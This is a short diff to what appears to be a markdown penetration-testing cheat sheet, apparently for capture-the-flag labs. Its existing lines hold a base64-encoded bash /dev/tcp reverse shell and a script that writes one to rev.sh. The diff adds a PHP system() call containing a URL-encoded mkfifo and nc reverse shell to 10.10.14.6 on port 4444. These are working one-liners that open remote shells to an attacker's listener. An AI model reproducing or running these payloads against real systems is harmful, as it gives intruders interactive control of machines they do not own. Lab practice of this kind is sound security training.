@@ -17,6 +17,10 @@ python3 PowerJoker.py -l 10.10.16.84 -p 1337
 echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
 
 echo -e '#!/bin/bash\nsh -i >& /dev/tcp/10.10.14.70/4444 0>&1' > rev.sh
+
+```
+```php
+system('rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/bash+-i+2>%261|nc+10.10.14.6+4444+>/tmp/f')
 ```
 ##### Upgrade shell to fully interactive:
 ```bash
